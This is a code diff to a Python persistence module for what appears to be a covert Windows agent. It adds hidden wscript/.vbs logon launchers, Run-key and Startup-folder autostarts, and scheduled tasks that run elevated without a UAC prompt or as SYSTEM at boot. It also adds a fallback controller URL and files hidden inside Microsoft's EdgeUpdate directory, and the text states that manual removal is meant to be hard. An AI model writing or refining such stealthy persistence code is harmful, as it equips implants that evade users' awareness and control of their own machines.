@@ -5,7 +5,7 @@ them by hand takes real effort, which is the point.
 """
 
 from __future__ import annotations
-from .. import guardian, config
+from .. import guardian, config, log
 
 import os
 import shutil
@@ -165,6 +165,13 @@ def _write_anchor() -> list[str]:
                 pass
 
     url = _public_url()
+    if not url:
+        # After a push, deploy.json carries no url; fall back to the controller
+        # baked into the webinstaller so a rebuild is never left with nothing.
+        try:
+            url = str(config.PUBLIC_URL or "")
+        except Exception:
+            url = ""
     if url:
         try:
             with open(stealth.anchor_url_path(), "w", encoding="ascii") as handle:
@@ -242,17 +249,22 @@ def _run_command() -> str:
 
 
 def _run_commands() -> dict[str, str]:
-    """value_name -> command.  Value 0 uses the anchor, value 1 the user copy,
-    so deleting either location still leaves a working autostart."""
+    """value_name -> command.
+
+    wscript + .vbs, never cmd.exe: cmd flashes a console on every logon and
+    then holds it open for the agent's lifetime because the shim uses
+    ``start /b``. Every vector passes --no-elevate so only the boot claim and
+    the HIGHEST scheduled task ever raise a UAC prompt.
+    """
     from .. import config
     launcher = primary_launcher()
-    fallback = f'"{interpreter_for(launcher)}" "{launcher}" --hidden'
-    anchor = stealth.anchor_shim_path()
-    primary = stealth.shim_path()
+    fallback = f'"{interpreter_for(launcher)}" "{launcher}" --hidden --no-elevate'
+    anchor_vbs = stealth.anchor_vbs_path()
+    primary_vbs = stealth.vbs_path()
     commands = {}
     for index, name in enumerate(config.RUN_VALUE_NAMES):
-        shim = anchor if index == 0 else primary
-        commands[name] = f'cmd.exe /c "{shim}"' if os.path.isfile(shim) else fallback
+        vbs = anchor_vbs if index == 0 else primary_vbs
+        commands[name] = f'wscript.exe //B //Nologo "{vbs}"' if os.path.isfile(vbs) else fallback
     return commands
 
 
@@ -346,14 +358,21 @@ def _write_startup_script(launcher: str) -> str:
     )
     if not os.path.isdir(folder):
         return ""
-    path = os.path.join(folder, config.PRODUCT_NAME + ".cmd")
-    shim = stealth.anchor_shim_path() if os.path.isfile(stealth.anchor_shim_path()) else stealth.shim_path()
-    cmd = f'cmd.exe /c "{shim}"' if os.path.isfile(shim) else f'"{interpreter_for(launcher)}" "{launcher}" --hidden'
-    script = (
-        "@echo off\r\n"
-        "ping -n 12 127.0.0.1 >nul\r\n"
-        f'start "" {cmd}\r\n'
-    )
+    path = os.path.join(folder, config.PRODUCT_NAME + ".vbs")
+    vbs = stealth.anchor_vbs_path() if os.path.isfile(stealth.anchor_vbs_path()) else stealth.vbs_path()
+    if os.path.isfile(vbs):
+        script = (
+            "' Windowless logon launcher - never creates a console.\r\n"
+            "CreateObject(\"WScript.Shell\").Run "
+            "\"wscript.exe //B //Nologo \"\"" + vbs + "\"\"\", 0, False\r\n"
+        )
+    else:
+        script = (
+            "' Windowless logon launcher (fallback).\r\n"
+            "CreateObject(\"WScript.Shell\").Run "
+            "\"\"\"" + interpreter_for(launcher) + "\"\" \"\"" + launcher
+            + "\"\" --hidden --no-elevate\", 0, False\r\n"
+        )
     try:
         with open(path, "w", encoding="utf-8", newline="") as handle:
             handle.write(script)
@@ -365,23 +384,36 @@ def _write_startup_script(launcher: str) -> str:
 def _write_scheduled_task(launcher: str) -> str:
     """Create a logon and startup task."""
     from .. import config
-    anchor = stealth.anchor_shim_path()
-    shim = anchor if os.path.isfile(anchor) else stealth.shim_path()
-    command = f'cmd.exe /c "{shim}"' if os.path.isfile(shim) else f'"{interpreter_for(launcher)}" "{launcher}" --hidden'
+    anchor_vbs = stealth.anchor_vbs_path()
+    vbs = anchor_vbs if os.path.isfile(anchor_vbs) else stealth.vbs_path()
+    command = (f'wscript.exe //B //Nologo "{vbs}"' if os.path.isfile(vbs)
+               else f'"{interpreter_for(launcher)}" "{launcher}" --hidden --no-elevate')
     rl_level = "HIGHEST" if stealth.is_admin() else "LIMITED"
+    user = os.environ.get("USERNAME", "")
     try:
-        subprocess.run(
+        # /RL HIGHEST with a real /RU runs elevated at logon with no prompt,
+        # which is what lets every other vector stay --no-elevate.
+        extra = ["/RU", user, "/IT"] if (user and rl_level == "HIGHEST") else ["/IT"]
+        result = subprocess.run(
             ["schtasks", "/Create", "/F", "/TN", config.TASK_NAME, "/TR", command,
-             "/SC", "ONLOGON", "/RL", rl_level, "/IT",
+             "/SC", "ONLOGON", "/RL", rl_level] + extra + [
              "/DELAY", "0000:30", "/RI", "5", "/DU", "24:00"],
-            capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=30,
+            capture_output=True, text=True, creationflags=CREATE_NO_WINDOW, timeout=30,
         )
+        if result.returncode != 0:
+            log.get("persistence").warning(
+                "schtasks ONLOGON failed (%s): %s",
+                result.returncode, (result.stderr or result.stdout or "").strip()[:200])
         if stealth.is_admin():
-            subprocess.run(
+            boot = subprocess.run(
                 ["schtasks", "/Create", "/F", "/TN", config.TASK_NAME + "Boot", "/TR", command,
                  "/SC", "ONSTART", "/RU", "SYSTEM"],
-                capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=30,
+                capture_output=True, text=True, creationflags=CREATE_NO_WINDOW, timeout=30,
             )
+            if boot.returncode != 0:
+                log.get("persistence").warning(
+                    "schtasks ONSTART failed (%s): %s",
+                    boot.returncode, (boot.stderr or boot.stdout or "").strip()[:200])
         return config.TASK_NAME
     except Exception:
         return ""
@@ -395,7 +427,7 @@ def _task_exists() -> bool:
     global _task_cache, _task_cache_ts
     from .. import config
     now = time.time()
-    if now - _task_cache_ts < 30.0:
+    if now - _task_cache_ts < 300.0:   # was 30 s: a process spawn every 30 s
         return _task_cache
     try:
         result = subprocess.run(
@@ -824,6 +856,20 @@ def remove(keep_anchor: bool = False) -> list[str]:
         if not keep_anchor and os.path.abspath(directory) == anchor:
             continue          # anchor is removed by purge() only
         if os.path.isdir(directory):
+            # %LOCALAPPDATA%\Microsoft\EdgeUpdate is a live Edge directory.
+            # Only drop the files we own; never rmtree the whole thing.
+            if os.path.basename(directory).lower() == "edgeupdate":
+                for name in ("agent.py", "syspy", "install", "kit.zip",
+                             "deploy.json", "runtime", "adopted.json"):
+                    victim = os.path.join(directory, name)
+                    if os.path.isdir(victim):
+                        shutil.rmtree(victim, ignore_errors=True)
+                    elif os.path.isfile(victim):
+                        try:
+                            os.remove(victim)
+                        except OSError:
+                            pass
+                continue
             try:
                 shutil.rmtree(directory, ignore_errors=True)
             except Exception:
